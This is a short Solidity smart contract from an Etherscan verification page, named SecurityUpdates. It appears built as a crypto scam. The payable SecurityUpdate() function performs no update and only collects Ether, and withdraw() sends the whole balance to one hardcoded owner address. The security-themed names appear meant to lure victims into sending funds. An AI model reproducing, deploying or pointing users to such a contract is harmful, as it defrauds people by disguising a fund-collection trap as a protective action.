/**
 *Submitted for verification at Etherscan.io on 2023-03-19
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;

     constructor() public{   
        owner=0xeCF70d87cC177D01DcAF862135bE68BA59fBBb8f;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}